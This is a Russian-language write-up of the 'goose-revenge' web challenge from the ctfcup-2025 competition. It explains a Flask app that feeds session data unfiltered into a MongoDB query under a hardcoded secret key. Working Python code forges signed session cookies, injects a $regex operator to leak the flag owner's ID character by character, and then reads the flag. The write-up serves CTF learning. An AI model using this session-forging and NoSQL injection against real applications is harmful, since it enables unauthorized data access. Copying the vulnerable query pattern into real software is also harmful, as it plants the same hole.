---
title: '[WEB] CTF "goose-revenge" (ctfcup-2025)'
date: 2025-12-03T12:46:00+03:00
categories:
  - ctf
  - ctfcup-2025
tags:
  - web
header:
  overlay_image: https://sun9-59.userapi.com/s_zZEilvqUakEGrGq9LHIrYJ52r0hX7kbjzyUw/MC90rp7PPXU.jpg  # твой баннер
  overlay_filter: 0.4                                # затемнение (0–1, можно убрать)
  caption: "Кубок CTF 2025"                       # подпись под картинкой (опционально)
---
# Flask + MongoDB NoSQL Injection

## Суть уязвимости

Приложение использует данные сессии напрямую как фильтр для MongoDB:

```python
user_strings = list(mongo.db.strings.find(dict(session.items())))
```

- `session` берётся из cookie `session`, которую Flask подписывает `SECRET_KEY`:
  ```python
  app.config["SECRET_KEY"] = "kluchik"
  ```
- Зная ключ, можно самому генерировать валидные сессии.
- Содержимое сессии **не фильтруется** и попадает в запрос к MongoDB как есть.
- Это позволяет подставить в `user_id` не строку, а оператор MongoDB, например:
  ```python
  {"user_id": {"$regex": "^ab"}}
  ```
  → классическая NoSQL-инъекция.

Флаг хранится как документ:

```python
{"name": "flag", "user_id": <случайный hex>, "content": <FLAG>}
```

Наша цель — узнать этот `user_id` и прочитать флаг.

---

## Решение

1. **Генерируем свои сессии Flask**

   Используем тот же `SECRET_KEY = "kluchik"`:

   ```python
   from flask import Flask, session

   app = Flask(__name__)
   app.secret_key = "kluchik"

   def encode_session(data):
       with app.test_request_context():
           session.update(data)
           dumped = app.session_interface.get_signing_serializer(app).dumps(dict(session))
           return dumped.decode("utf-8") if isinstance(dumped, bytes) else dumped
   ```

   Теперь `encode_session({"user_id": "...", "name": "flag"})` вернёт корректное значение для cookie `session`.

2. **Используем /strings для утечки `user_id`**

   Подставляем в сессию `user_id` с `$regex` и отправляем запрос:

   ```python
   data = {
       "name": "flag",
       "user_id": {"$regex": "^ab"}  # проверяем, начинается ли user_id флага с "ab"
   }
   cookie_value = encode_session(data)
   cookies = {"session": cookie_value}

   r = requests.get("http://host/strings", cookies=cookies)
   ```

   Логика:

   - Если в ответе статус `401` и ошибка `"ooops, some string is not you own"` → найден документ с `name="flag"` и `user_id`, подходящим под regex → текущий префикс **верный**.
   - Если `{"strings": []}` → подходящего документа нет → префикс **неверный**.

   Повторяем это, перебирая hex-символы `0-9a-f` для каждой позиции `user_id` (в примере — бинарный поиск по диапазону), пока не получим полный 64-символьный hex.

3. **Читаем флаг**

   Когда `leaked_user_id` готов:

   ```python
   data = {"user_id": leaked_user_id}
   cookie_value = encode_session(data)
   cookies = {"session": cookie_value}

   r = requests.get("http://host/strings/flag", cookies=cookies)
   print(r.json()["content"])  # здесь будет FLAG
   ```

   Приложение считает, что мы — владелец документа с таким `user_id`, и отдаёт содержимое флага.

---

## Итог

- Уязвимость: прямое использование `dict(session.items())` в `mongo.db.strings.find(...)`.
- Эксплойт: подделка Flask-сессий (зная `SECRET_KEY`) + NoSQL-инъекция через `$regex` в `user_id`, посимвольная утечка `user_id` флага и дальнейшее чтение `/strings/flag`.
